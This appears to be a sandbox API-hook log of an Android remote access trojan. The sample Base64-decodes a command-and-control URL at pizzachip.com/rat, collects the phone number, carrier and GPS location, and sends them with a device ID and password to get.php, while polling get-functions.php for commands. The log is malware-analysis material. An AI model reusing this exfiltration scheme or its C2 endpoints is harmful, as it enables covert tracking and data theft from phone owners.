{"timestamp":1521070912197,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070912209,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070912218,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070912229,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070921357,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070921361,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070921376,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070921389,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070921392,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070921407,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070921423,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070921499,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=201&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070921504,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=201&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070921529,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=201&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070921535,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070921407,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070921609,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070921533,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070921634,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070921645,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070921654,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070937657,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070937671,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070937677,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070937693,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070937698,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070937719,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070937661,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070937661,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070937773,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070937784,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070937792,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070937801,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070938634,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=302&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070938639,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=302&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070938658,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=302&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070938663,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070938661,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070948736,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070948740,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070948766,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070948776,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070948791,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070948868,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070948875,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070950169,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=93&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070950174,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=93&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070950196,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=93&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070950201,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070948867,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070950236,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070950242,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070950199,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070950273,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070950278,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070954051,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1521070954068,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1521070954095,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1521070954099,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1521070955043,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1521070955050,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1521070955075,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1521070955083,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1521070956044,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1521070956078,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1521070956132,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1521070956157,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1521070956876,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1521070956900,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1521070956909,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1521070956917,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1521070960277,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070960284,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070960292,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070960309,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070960321,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070960326,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070960347,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070960276,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070960373,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070960393,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=909&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070960399,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=909&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070960417,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=909&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070960388,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070960468,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070960513,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070960467,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070960525,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070970612,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070970620,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070970628,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070970644,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070970658,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070970661,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070970683,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070970780,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=951&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070970785,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=951&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070970805,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=951&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070970811,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070970810,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070970611,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070971779,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070971796,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070971800,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070971815,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070986886,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070986893,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070986911,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070986922,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070986926,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070986947,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070986891,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070986890,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070986996,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070987007,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070987024,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1521070987034,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070987043,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070987318,"result":{"descriptor":62},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/system\/etc\/security\/cacerts\/9772ca32.0","0"]}
{"timestamp":1521070987440,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/misc\/keychain\/cacerts-removed\/9772ca32.0"},"args":[]}
{"timestamp":1521070988102,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=298&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070988108,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=298&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070988127,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=298&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070988142,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070988133,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
